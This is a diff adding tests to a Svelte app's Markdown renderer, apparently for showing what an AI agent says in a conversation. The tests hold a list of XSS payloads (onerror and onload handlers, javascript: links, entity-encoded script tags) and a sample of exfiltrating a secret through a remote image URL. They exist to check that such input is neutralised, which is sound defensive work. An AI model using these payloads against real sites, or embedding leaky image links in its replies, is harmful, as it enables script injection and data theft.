@@ -9,6 +9,7 @@ import {
   ownerFor,
   presented,
   render,
+  renderSaid,
   resetMedia,
 } from "$lib/media.svelte";
 import { closeViewer, files } from "$lib/files.svelte";
@@ -251,5 +252,110 @@ describe("presenting", () => {
     });
     const gone = await load("/one/missing.png");
     expect("error" in gone && gone.error).toContain("could not read");
+  });
+});
+
+describe("what an agent says in a conversation", () => {
+  it("is rendered as a document is, with an image from an address shown as a link to it", () => {
+    const html = renderSaid(
+      "Look ![chart](https://example.com/leak?x=secret) and ![dot](data:image/png;base64,AAAA) and [docs](https://example.com) <img src=x>",
+    );
+    expect(html).not.toContain('src="https://example.com');
+    expect(html).toContain('<a href="https://example.com/leak?x=secret" rel="noopener noreferrer">chart</a>');
+    expect(html).toContain('<img src="data:image/png;base64,AAAA" alt="dot">');
+    expect(html).toContain('<a href="https://example.com" rel="noopener noreferrer">docs</a>');
+    expect(html).not.toContain("<img src=x");
+    expect(html).toContain("&lt;img");
+    expect(renderSaid("![x](javascript:alert(1))")).not.toContain("javascript:");
+  });
+});
+
+describe("code in Markdown", () => {
+  it("shows a less-than sign as itself, in fenced code, in inline code and in text", () => {
+    const md = "If `a < b` then:\n\n```ts\nif (a < b && c > d) { return `<b>${a}</b>`; }\n```\n\nand 1 < 2.";
+    for (const html of [renderSaid(md), render(md)]) {
+      expect(html).not.toContain("&amp;lt;");
+      expect(html).toContain("<code>a &lt; b</code>");
+      expect(html).toContain("if (a &lt; b &amp;&amp; c &gt; d) { return `&lt;b&gt;${a}&lt;/b&gt;`; }");
+      expect(html).toContain("1 &lt; 2");
+      const box = document.createElement("div");
+      box.innerHTML = html;
+      expect(box.querySelector("pre code")?.textContent).toBe("if (a < b && c > d) { return `<b>${a}</b>`; }\n");
+      expect(box.querySelector("p code")?.textContent).toBe("a < b");
+    }
+  });
+
+  it("still draws raw HTML as its text, inline and as a block", () => {
+    for (const html of [renderSaid("Hi <b>there</b>\n\n<div onclick=x>block</div>"), render("Hi <b>there</b>\n\n<div onclick=x>block</div>")]) {
+      const box = document.createElement("div");
+      box.innerHTML = html;
+      expect(box.querySelector("b, div")).toBeNull();
+      expect(box.textContent).toContain("<b>there</b>");
+      expect(box.textContent).toContain("<div onclick=x>block</div>");
+    }
+  });
+});
+
+describe("what Markdown may draw", () => {
+  const ELEMENTS = new Set(
+    "P,BR,EM,STRONG,DEL,CODE,PRE,A,IMG,UL,OL,LI,BLOCKQUOTE,H1,H2,H3,H4,H5,H6,HR,TABLE,THEAD,TBODY,TR,TH,TD,INPUT".split(","),
+  );
+  const PAYLOADS = [
+    "x <code> <img/src=x onerror=alert(1)>",
+    "<pre> <svg/onload=alert(1)>",
+    "<kbd> <img/src=x onerror=1> </kbd>",
+    "<script> <iframe/src=javascript:1>",
+    "a <!-- x --> <img src=x onerror=1>",
+    "`x` <b onmouseover=1>y</b>",
+    "<details><summary>a</summary><img src=x onerror=1></details>",
+    "[a](javascript:alert(1)) ![b](javascript:alert(1))",
+    "* <code>\n* <img/src=x onerror=1>",
+    "> <pre>\n> <img/src=x onerror=1>",
+    "| <code> | <img/src=x onerror=1> |\n| --- | --- |\n| a | b |",
+    // Entities that spell markup, before a raw tag and anywhere else.
+    "&lt;img src=x onerror=alert(1)&gt;",
+    "&#60;script&#62;alert(1)&#60;/script&#62;",
+    "&#x3C;svg/onload=1&#x3E; <code> &lt;b onmouseover=1&gt;",
+    "[a](&#106;avascript:alert(1)) [b](java&#115;cript:1)",
+    "&amp;lt;img src=x onerror=1&amp;gt;",
+  ];
+
+  it("draws nothing but Markdown's own elements, with no handlers and no scripted links", () => {
+    for (const markdown of PAYLOADS)
+      for (const html of [render(markdown), renderSaid(markdown)]) {
+        const box = document.createElement("div");
+        box.innerHTML = html;
+        for (const element of box.querySelectorAll("*")) {
+          expect(ELEMENTS.has(element.tagName), `${element.tagName} from ${markdown}`).toBe(true);
+          for (const attribute of element.attributes) {
+            expect(attribute.name.startsWith("on"), `${attribute.name} from ${markdown}`).toBe(false);
+            expect(/javascript:/i.test(attribute.value), `${attribute.value} from ${markdown}`).toBe(false);
+          }
+        }
+      }
+  });
+
+  it("draws an entity as its character, and markup an entity spells as its letters", () => {
+    for (const html of [render("AT&T &copy; &mdash; a&nbsp;b &amp;"), renderSaid("AT&T &copy; &mdash; a&nbsp;b &amp;")]) {
+      const box = document.createElement("div");
+      box.innerHTML = html;
+      expect(box.textContent?.trim()).toBe("AT&T © — a\u00a0b &");
+    }
+    for (const html of [render("&lt;b&gt;x&lt;/b&gt; &#60;i&#62;"), renderSaid("&lt;b&gt;x&lt;/b&gt; &#60;i&#62;")]) {
+      const box = document.createElement("div");
+      box.innerHTML = html;
+      expect(box.querySelector("b, i")).toBeNull();
+      expect(box.textContent?.trim()).toBe("<b>x</b> <i>");
+    }
+    // In code an entity is the letters it is.
+    const box = document.createElement("div");
+    box.innerHTML = renderSaid("`&copy;`");
+    expect(box.querySelector("code")?.textContent).toBe("&copy;");
+  });
+
+  it("escapes text once, after a raw tag as anywhere else", () => {
+    const box = document.createElement("div");
+    box.innerHTML = renderSaid("x <code> a & b < c");
+    expect(box.textContent?.trim()).toBe("x <code> a & b < c");
   });
 });
